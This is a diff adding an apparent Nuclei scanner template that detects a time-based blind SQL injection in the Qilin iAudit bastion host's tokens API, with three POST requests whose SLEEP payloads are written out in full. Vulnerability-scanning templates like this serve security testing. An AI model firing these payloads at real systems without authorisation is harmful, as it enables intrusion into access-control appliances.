@@ -1,0 +1,52 @@
+id: qilinsoft-tokens-sqli
+info:
+  name: 麒麟 iAudit tokens 接口 - SQL 注入漏洞
+  author: secking
+  severity: high
+  reference:
+    - https://www.tosec.com.cn/
+  metadata:
+    verified: true
+    max-request: 3
+    vuln-id: CT-839293
+    vendor: qilinsoft
+    product: iaudit
+  tags: sqli,vuln,qilinsoft
+variables:
+  sleepSecond1: '{{rand_int(6, 8)}}'
+  sleepSecond2: '{{rand_int(3, 5)}}'
+flow: http(1) && http(2) && http(3)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/baoleiji/api/tokens'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(0)))ptGN) AND 'AAdm'='AAdm&title=%40127.0.0.1
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 403'
+  - method: POST
+    path:
+      - '{{BaseURL}}/baoleiji/api/tokens'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP({{sleepSecond1}})))ptGN) AND 'AAdm'='AAdm&title=%40127.0.0.1
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 403 && duration * 1000 - r0latency >= sleepSecond1 * 1000 - 1000'
+  - method: POST
+    path:
+      - '{{BaseURL}}/baoleiji/api/tokens'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP({{sleepSecond2}})))ptGN) AND 'AAdm'='AAdm&title=%40127.0.0.1
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 403 && duration * 1000 - r0latency >= sleepSecond2 * 1000 - 1000'
